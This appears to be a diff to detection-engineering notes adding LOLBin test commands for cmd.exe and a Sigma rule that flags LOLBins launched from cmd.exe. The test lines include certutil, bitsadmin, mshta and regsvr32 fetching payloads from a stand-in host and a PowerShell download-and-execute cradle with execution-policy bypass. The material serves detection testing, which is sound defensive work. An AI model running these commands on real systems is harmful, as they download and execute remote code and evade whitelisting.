@@ -698,3 +698,76 @@ index=windows AND source="WinEventLog:Microsoft-Windows-PowerShell/Operational" 
 | eval severity = "Medium" 
 | rename dvc_nt_host AS dvc UserID AS user
 | table dvc user ScriptBlockText severity
+
+Testing LOLBin Execution in Windows Command Shell
+Here’s a list of test commands you can run in cmd.exe to verify detection:
+
+1️⃣ CertUtil (Download & Decode Files)
+cmd
+Copy
+Edit
+certutil -urlcache -f http://example.com/malware.exe C:\Users\Public\malware.exe
+certutil -decode C:\Users\Public\encoded.txt C:\Users\Public\decoded.txt
+2️⃣ Mshta (Execute Remote or Local Script)
+cmd
+Copy
+Edit
+mshta http://example.com/malicious.hta
+mshta vbscript:Execute("msgbox('LOLBIN TEST')")
+3️⃣ Rundll32 (Execute Code)
+cmd
+Copy
+Edit
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert('LOLBIN TEST')
+rundll32.exe url.dll,FileProtocolHandler http://example.com
+4️⃣ Regsvr32 (Bypass Application Whitelisting)
+c
+Copy
+Edit
+regsvr32.exe /s /n /u /i:http://example.com/malicious.sct scrobj.dll
+5️⃣ Bitsadmin (Download Malware)
+c
+Copy
+Edit
+bitsadmin /transfer myjob http://example.com/malware.exe C:\Users\Public\malware.exe
+6️⃣ WMIC (Execute Commands Remotely)
+c
+Copy
+Edit
+wmic process call create "cmd.exe /c calc.exe"
+7️⃣ Powershell (Execute via cmd.exe)
+cmd
+Copy
+Edit
+cmd.exe /c powershell.exe -ep bypass -c "iex(New-Object Net.WebClient).DownloadString('http://example.com')"
+
+
+title: Detect LOLBins Execution in Windows Command Shell
+id: 2fa8b8b1-d5a1-4d4e-a6f2-1a761b88e9df
+status: experimental
+description: Detects execution of LOLBins via cmd.exe
+author: Your Name
+logsource:
+  category: process_creation
+  product: windows
+detection:
+  selection:
+    ParentImage|endswith: '\cmd.exe'
+    Image|endswith:
+      - '\rundll32.exe'
+      - '\mshta.exe'
+      - '\certutil.exe'
+      - '\regsvr32.exe'
+      - '\wmic.exe'
+      - '\bitsadmin.exe'
+      - '\powershell.exe'
+  condition: selection
+fields:
+  - Image
+  - ParentImage
+  - CommandLine
+  - User
+level: high
+tags:
+  - attack.defense_evasion
+  - attack.execution
